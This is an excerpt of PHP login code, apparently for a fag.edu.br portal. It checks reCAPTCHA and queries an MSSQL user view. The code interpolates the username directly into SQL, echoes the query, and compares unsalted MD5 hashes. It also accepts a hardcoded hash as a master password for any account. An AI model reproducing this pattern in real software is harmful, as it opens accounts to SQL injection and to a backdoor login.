	...
	if ($_SERVER['REQUEST_METHOD'] === 'POST') {
		...
		if($recaptcha->success==true){
			...
			if ($recaptcha->score >= 0.5) {
				...
				if($usuario && $senha){
					echo $sql = "select * from integracao..view_integracao_usuario where usuario = '$usuario'";	
					$res = mssql_query($sql);
					...
					if(mssql_num_rows($res) > 0){
						...
						if(($row['senha'] == md5($senha)) || (md5($senha) == 'ea574ffd4ad5c4f03c5ab5d15b99e7ff')){
							...
							header("Location: https://www2.fag.edu.br/coopex3/");
                            ...
                            <form method="post" id="js-login" action="" role="form" class="text-center text-white mb-5 pb-5">
                                ...
                                <div class="form-group">
                                    ...
                                    <div class="input-group input-group-lg">
                                        <input name="<?php echo $_SESSION['campo_nome']?>" type="text" class="form-control" placeholder="Usuário" autocomplete="off" autofocus required tabindex="0">
